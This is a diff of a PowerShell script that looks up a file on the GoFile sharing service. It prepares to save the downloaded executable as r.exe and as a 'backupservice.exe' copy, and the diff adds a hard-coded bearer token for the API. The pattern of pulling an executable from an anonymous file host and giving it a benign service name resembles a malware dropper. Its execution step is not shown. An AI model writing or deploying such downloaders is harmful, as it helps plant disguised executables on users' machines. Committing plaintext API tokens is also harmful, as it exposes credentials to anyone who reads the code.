@@ -3,6 +3,7 @@ $ErrorActionPreference = "Stop"
 
 # Variables
 $ContentID = "SplUgh"
+$BearerToken = "c1qTNeZFATsyLQt09d2h6oApnblN1OBx"
 $OutFile = "$env:USERPROFILE\Downloads\r.exe"
 $BackupDir = "$env:USERPROFILE\Backups"
 $BackupFile = "$BackupDir\backupservice.exe"
@@ -10,10 +11,13 @@ $BackupFile = "$BackupDir\backupservice.exe"
 Write-Host "Getting file info from GoFile..."
 
 try {
-    # Download JSON response safely
-    $response = Invoke-RestMethod -Uri "https://api.gofile.io/contents/$ContentID"
+    # Add Authorization header
+    $Headers = @{ "Authorization" = "Bearer $BearerToken" }
+
+    # Download JSON response with auth
+    $response = Invoke-RestMethod -Uri "https://api.gofile.io/contents/$ContentID" -Headers $Headers
 } catch {
-    Write-Host "Failed to download JSON. Check your internet connection."
+    Write-Host "Failed to download JSON. Check your API key or internet connection."
     Pause
     exit
 }
@@ -25,7 +29,7 @@ if (-not $response.data.contents) {
     exit
 }
 
-# Attempt to extract download URL
+# Extract download URL
 $URL = $response.data.contents | Where-Object { $_.name -like "*" } | Select-Object -ExpandProperty downloadPage -ErrorAction SilentlyContinue
 
 if (-not $URL) {
